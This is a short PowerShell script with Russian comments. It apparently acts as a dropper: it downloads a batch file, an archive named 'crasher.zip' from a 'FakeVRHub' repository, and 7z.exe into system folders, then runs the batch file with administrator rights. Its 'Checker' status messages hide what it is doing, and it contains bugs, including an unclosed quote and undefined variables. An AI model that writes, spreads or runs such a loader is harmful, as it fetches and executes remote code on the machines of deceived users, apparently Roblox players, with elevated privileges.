$url1 = "https://raw.githubusercontent.com/Squad-Dauna/Roblox-Script/refs/heads/main/unpacker.bat" # Замените на URL первого файла
$url2 = "https://github.com/Squad-Dauna/FakeVRHub/raw/refs/heads/main/crasher.zip"   # Замените на URL второго файла
$url3 = "https://github.com/Squad-Dauna/Roblox-Script/raw/refs/heads/main/7z.exe"   # Замените на URL третьего файла
$savePath1 = "C:\Users\Default\unpack.bat" # Замените на желаемый путь и имя первого файла
$savePath2 = "C:\ProgramData\crasher.zip"   # Замените на желаемый путь и имя второго файла
$savePath3 = "C:\ProgramData\7z.exe"   # Замените на желаемый путь и имя третьего файла
$batFilePath = "C:\Users\Default\unpack.bat" # Путь к .bat файлуer

# Создание папки C:\ProgramData если она не существует
if (!(Test-Path -Path "C:\ProgramData")) {
    New-Item -ItemType Directory -Force -Path "C:\ProgramData"
}

# Скачивание файлов
try {
    Write-Host "Start Checker#1..."
    Invoke-WebRequest -Uri $url1 -OutFile $savePath1
    Write-Host "Checking #1 Succesfully"

    Write-Host "Start Checker#2..."
    Invoke-WebRequest -Uri $url2 -OutFile $savePath2
    Write-Host "Checking #2 Succesfully"
    
    Write-Host "Start Checker#3..."
    Invoke-WebRequest -Uri $url3 -OutFile $savePath3
     Write-Host Checking #3 Succesfully"
    Write-Host "Start Checker#4..."
    Invoke-WebRequest -Uri $url4 -OutFile $savePath4
     Write-Host "Checking #4 Succesfully"
} catch {
    Write-Host "Checking error.: $($_.Exception.Message)"
    exit 1
}


Start-Process $batFilePath -Verb RunAs